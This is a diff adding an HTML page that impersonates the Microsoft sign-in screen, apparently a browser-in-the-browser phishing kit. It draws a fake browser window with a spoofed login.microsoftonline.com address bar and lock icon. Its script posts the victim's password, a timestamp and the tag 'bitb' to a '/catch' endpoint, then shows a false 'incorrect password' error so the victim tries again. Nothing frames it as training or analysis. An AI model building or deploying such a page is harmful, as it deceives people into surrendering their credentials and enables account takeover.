@@ -1,0 +1,67 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8">
+<title>Sign in to your Microsoft account</title>
+<style>*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',Helvetica,Arial,sans-serif;background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify-content:center;}
+.card{background:white;padding:44px 44px 32px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.08)}
+.card .ms{font-size:22px;font-weight:600;color:#737373;margin-bottom:28px}
+.card .ms span{color:#f25022}
+.card h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:16px}
+.card input{width:100%;padding:8px 0;border:none;border-bottom:1px solid #666;font-size:15px;outline:none;margin-bottom:28px;background:transparent}
+.card input:focus{border-bottom:2px solid #0067b8}
+.card .next{padding:10px 28px;background:#0067b8;color:white;border:none;font-size:15px;cursor:pointer;float:right}
+.card .next:hover{background:#005ea6}
+.card .options{font-size:13px;color:#0067b8;margin-bottom:20px;cursor:pointer}
+.clear{clear:both}
+#ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:9999;align-items:center;justify-content:center}
+#ov.show{display:flex}
+.bw{width:440px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.4);animation:popIn .15s ease-out}
+@keyframes popIn{from{transform:scale(.92);opacity:0}to{transform:scale(1);opacity:1}}
+.tb{background:#dee1e6;padding:8px 10px 6px;display:flex;align-items:center;gap:8px}
+.dots{display:flex;gap:6px}.dots span{width:13px;height:13px;border-radius:50%;display:block}
+.dr{background:#ff5f57}.dy{background:#ffbd2e}.dg{background:#28c840}
+.ub{flex:1;background:white;border-radius:20px;padding:3px 12px;display:flex;align-items:center;gap:6px;font-size:13px;color:#333}
+.lock{color:#1a73e8;font-size:12px}.xbtn{background:none;border:none;font-size:18px;cursor:pointer;color:#666}
+.bd{background:white;padding:44px 44px 32px}
+.bd .ms2{font-size:20px;font-weight:600;color:#737373;margin-bottom:24px}
+.bd h2{font-size:22px;font-weight:600;color:#1b1b1b;margin-bottom:14px}
+.bd .sub2{font-size:13px;color:#666;margin-bottom:20px}
+.bd input{width:100%;padding:8px 0;border:none;border-bottom:1px solid #666;font-size:15px;outline:none;margin-bottom:24px;background:transparent;box-sizing:border-box}
+.bd input:focus{border-bottom:2px solid #0067b8}
+.bd .bs{padding:10px 28px;background:#0067b8;color:white;border:none;font-size:15px;cursor:pointer;float:right}
+.bd .err{display:none;color:#d93025;font-size:13px;margin-bottom:12px}
+.bd .clear{clear:both;padding-top:12px}
+</style></head><body>
+<div class="card">
+<div class="ms">&#9632;&#9632;&#9632;&#9632; Microsoft</div>
+<h1>Sign in</h1>
+<input type="email" placeholder="Email, phone, or Skype" onfocus="showB()">
+<p class="options">No account? <span style="color:#0067b8">Create one!</span></p>
+<div><button class="next" onclick="showB()">Next</button></div>
+<div class="clear"></div>
+</div>
+<div id="ov"><div class="bw">
+<div class="tb">
+<div class="dots"><span class="dr" onclick="hideB()"></span><span class="dy"></span><span class="dg"></span></div>
+<div class="ub"><span class="lock">&#128274;</span><span><strong>login.microsoftonline.com</strong></span></div>
+<button class="xbtn" onclick="hideB()">&#x2715;</button></div>
+<div class="bd">
+<div class="ms2">&#9632;&#9632;&#9632;&#9632; Microsoft</div>
+<h2>Enter password</h2>
+<p class="sub2" id="ushow"></p>
+<form id="lf" onsubmit="doSub(event)">
+<input type="text" id="fu" placeholder="someone@example.com" style="display:none">
+<input type="password" id="fp" placeholder="Password" required>
+<p class="err" id="em">Your account or password is incorrect.</p>
+<div><button class="bs" type="submit">Sign in</button></div>
+<div class="clear"></div>
+</form></div></div></div>
+<script>
+function showB(){document.getElementById('ov').classList.add('show');setTimeout(()=>document.getElementById('fp').focus(),150);}
+function hideB(){document.getElementById('ov').classList.remove('show');}
+document.getElementById('ov').addEventListener('click',function(e){if(e.target===this)hideB();});
+function doSub(e){e.preventDefault();
+var u=document.getElementById('fu').value,p=document.getElementById('fp').value;
+fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'bitb'})}).catch(()=>{});
+var b=e.target.querySelector('.bs');b.textContent='Signing in…';b.disabled=true;
+setTimeout(()=>{document.getElementById('em').style.display='block';b.textContent='Sign in';b.disabled=false;document.getElementById('fp').value='';document.getElementById('fp').focus();},1800);}
+</script></body></html>
